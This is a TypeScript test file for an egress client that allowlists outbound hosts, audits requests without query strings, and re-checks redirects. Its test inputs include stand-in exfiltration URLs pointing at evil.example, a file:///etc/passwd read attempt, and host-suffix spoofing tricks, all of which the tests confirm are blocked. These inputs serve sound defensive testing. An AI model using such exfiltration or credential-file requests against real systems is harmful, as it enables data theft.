import { describe, expect, it, vi } from 'vitest';
import { EgressBlockedError, EgressClient, EgressConfig, type AllowedHost } from '../src/egress/egress.client.js';
import type { PrismaService } from '../src/prisma.service.js';

function setup(fetchImpl: typeof fetch, allowlist?: AllowedHost[]) {
  const audits: Record<string, unknown>[] = [];
  const prisma = { auditLog: { create: async ({ data }: { data: Record<string, unknown> }) => void audits.push(data) } } as unknown as PrismaService;
  const cfg = new EgressConfig();
  cfg.fetchImpl = fetchImpl;
  if (allowlist) cfg.allowlist = allowlist;
  return { client: new EgressClient(prisma, cfg), audits, cfg };
}
const ok = (body = 'hello') => vi.fn(async () => new Response(body, { status: 200 }));
const req = { connectorId: 't', caseId: 'case-1', runId: 'run-1' };

describe('allowlist', () => {
  it('loads config/egress-allowlist.yaml', () => {
    const hosts = new EgressConfig().allowlist.map((h) => h.host);
    expect(hosts).toEqual(expect.arrayContaining(['api.github.com', 'api.etherscan.io', 'sandbox-web', 'localhost']));
  });

  it('allows listed hosts and audits path-only (no query string, no headers)', async () => {
    const f = ok();
    const { client, audits } = setup(f as unknown as typeof fetch);
    const res = await client.get('http://sandbox-web/search?q=secret-nick&key=abc', { ...req, headers: { Authorization: 'Bearer x' } });
    expect(res).toMatchObject({ status: 200, ok: true, text: 'hello', fromCache: false });
    expect(audits).toEqual([{ caseId: 'case-1', runId: 'run-1', connectorId: 't', host: 'sandbox-web', path: '/search', status: 200, durationMs: expect.any(Number) }]);
    expect(JSON.stringify(audits)).not.toMatch(/secret-nick|abc|Bearer/);
  });

  it('sends a generic User-Agent without personal contact data', async () => {
    const f = ok();
    const { client } = setup(f as unknown as typeof fetch);
    await client.get('http://sandbox-web/', req);
    const init = (f.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect((init.headers as Record<string, string>)['User-Agent']).toMatch(/^olcys-osint/);
    expect((init.headers as Record<string, string>)['User-Agent']).not.toMatch(/@/);
  });

  it('blocks unlisted hosts and non-http schemes without calling fetch, and records the attempt', async () => {
    const f = ok();
    const { client, audits } = setup(f as unknown as typeof fetch);
    await expect(client.get('https://evil.example/exfil?data=1', req)).rejects.toBeInstanceOf(EgressBlockedError);
    await expect(client.get('file:///etc/passwd', req)).rejects.toBeInstanceOf(EgressBlockedError);
    expect(f).not.toHaveBeenCalled();
    expect(audits.map((a) => [a.host, a.path, a.status])).toEqual([
      ['evil.example', '/exfil', 0],
      ['', '/etc/passwd', 0],
    ]);
  });

  it('matches the host exactly (no suffix tricks)', async () => {
    const { client } = setup(ok() as unknown as typeof fetch);
    await expect(client.get('https://api.github.com.evil.example/', req)).rejects.toBeInstanceOf(EgressBlockedError);
    await expect(client.get('https://evil-sandbox-web/', req)).rejects.toBeInstanceOf(EgressBlockedError);
  });
});

describe('POST', () => {
  it('sends a JSON body, audits host + path only, does not cache by default and does not follow redirects', async () => {
    const f = ok('{"result":"0x"}');
    const { client, audits } = setup(f as unknown as typeof fetch);
    const a = await client.post('http://sandbox-web/rpc?key=secret', { method: 'eth_call', params: ['top-secret-address'] }, req);
    await client.post('http://sandbox-web/rpc?key=secret', { method: 'eth_call', params: ['top-secret-address'] }, req);
    expect(a).toMatchObject({ status: 200, ok: true, fromCache: false });
    expect(f).toHaveBeenCalledTimes(2); // POSTs are not cached unless asked
    const init = (f.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect(init.method).toBe('POST');
    expect((init.headers as Record<string, string>)['Content-Type']).toBe('application/json');
    expect(JSON.parse(String(init.body))).toEqual({ method: 'eth_call', params: ['top-secret-address'] });
    expect(audits[0]).toMatchObject({ host: 'sandbox-web', path: '/rpc', status: 200 });
    expect(JSON.stringify(audits)).not.toMatch(/secret|eth_call/);

    const cached = setup(ok() as unknown as typeof fetch);
    await cached.client.post('http://sandbox-web/rpc', { id: 1 }, { ...req, cacheTtlMs: 60_000 });
    expect((await cached.client.post('http://sandbox-web/rpc', { id: 1 }, { ...req, cacheTtlMs: 60_000 })).fromCache).toBe(true);
    expect((await cached.client.post('http://sandbox-web/rpc', { id: 2 }, { ...req, cacheTtlMs: 60_000 })).fromCache).toBe(false); // the body is part of the key

    const moved = setup(vi.fn(async () => new Response(null, { status: 307, headers: { location: 'https://evil.example/' } })) as unknown as typeof fetch);
    expect((await moved.client.post('http://sandbox-web/rpc', {}, req)).ok).toBe(false); // returned as is, never followed
    await expect(moved.client.post('https://evil.example/', {}, req)).rejects.toBeInstanceOf(EgressBlockedError);
  });
});

describe('redirects', () => {
  it('re-checks every hop: a redirect to an unlisted host is blocked', async () => {
    const f = vi.fn(async () => new Response(null, { status: 302, headers: { location: 'https://evil.example/steal' } }));
    const { client, audits } = setup(f as unknown as typeof fetch);
    await expect(client.get('http://sandbox-web/start', req)).rejects.toBeInstanceOf(EgressBlockedError);
    expect(f).toHaveBeenCalledTimes(1);
    expect(audits.map((a) => [a.host, a.status])).toEqual([
      ['sandbox-web', 302],
      ['evil.example', 0],
    ]);
  });

  it('follows redirects between allowed hosts (relative locations too)', async () => {
    const f = vi
      .fn()
      .mockResolvedValueOnce(new Response(null, { status: 301, headers: { location: '/moved' } }))
      .mockResolvedValueOnce(new Response('final', { status: 200 }));
    const { client, audits } = setup(f as unknown as typeof fetch);
    const res = await client.get('http://sandbox-web/old', req);
    expect(res).toMatchObject({ text: 'final', url: 'http://sandbox-web/moved' });
    expect(audits.map((a) => [a.path, a.status])).toEqual([
      ['/old', 301],
      ['/moved', 200],
    ]);
  });

  it('gives up on redirect loops', async () => {
    const f = vi.fn(async () => new Response(null, { status: 302, headers: { location: '/again' } }));
    const { client } = setup(f as unknown as typeof fetch);
    await expect(client.get('http://sandbox-web/loop', req)).rejects.toThrow(/too many redirects/);
  });
});

describe('cache, rate limit, errors', () => {
  it('serves repeated GETs from the cache without a second request or audit row', async () => {
    const f = ok();
    const { client, audits } = setup(f as unknown as typeof fetch);
    const a = await client.get('http://sandbox-web/x', req);
    const b = await client.get('http://sandbox-web/x', req);
    expect([a.fromCache, b.fromCache]).toEqual([false, true]);
    expect(f).toHaveBeenCalledTimes(1);
    expect(audits).toHaveLength(1);
    await client.get('http://sandbox-web/x', { ...req, cacheTtlMs: 0 });
    expect(f).toHaveBeenCalledTimes(2);
  });

  it('does not cache server errors and keeps credentialed responses apart', async () => {
    const f = vi.fn().mockResolvedValueOnce(new Response('boom', { status: 503 })).mockResolvedValue(new Response('fine', { status: 200 }));
    const { client } = setup(f as unknown as typeof fetch);
    expect((await client.get('http://sandbox-web/e', req)).status).toBe(503);
    expect((await client.get('http://sandbox-web/e', req)).status).toBe(200);
    const g = ok('anon');
    const c2 = setup(g as unknown as typeof fetch).client;
    await c2.get('http://sandbox-web/p', req);
    expect((await c2.get('http://sandbox-web/p', { ...req, headers: { Authorization: 'Bearer t' } })).fromCache).toBe(false);
  });

  it('spaces requests to a host by its rate limit, in order, even when issued concurrently', async () => {
    const stamps: number[] = [];
    const f = vi.fn(async () => (stamps.push(Date.now()), new Response('x')));
    const { client } = setup(f as unknown as typeof fetch, [{ host: 'slow.example', rateLimitPerSec: 20 }]); // 50 ms apart
    await Promise.all([1, 2, 3].map((i) => client.get(`https://slow.example/${i}`, req)));
    expect(stamps[2]! - stamps[0]!).toBeGreaterThanOrEqual(90);
  });

  it('audits network failures (status -1) and rethrows', async () => {
    const { client, audits } = setup((async () => {
      throw new Error('ECONNRESET');
    }) as unknown as typeof fetch);
    await expect(client.get('http://sandbox-web/down', req)).rejects.toThrow('ECONNRESET');
    expect(audits[0]).toMatchObject({ host: 'sandbox-web', status: -1 });
  });

  it('rejects oversized responses', async () => {
    const { client, cfg } = setup(ok('x'.repeat(50)) as unknown as typeof fetch);
    cfg.maxBytes = 10;
    await expect(client.get('http://sandbox-web/big', req)).rejects.toThrow(/exceeds/);
  });
});
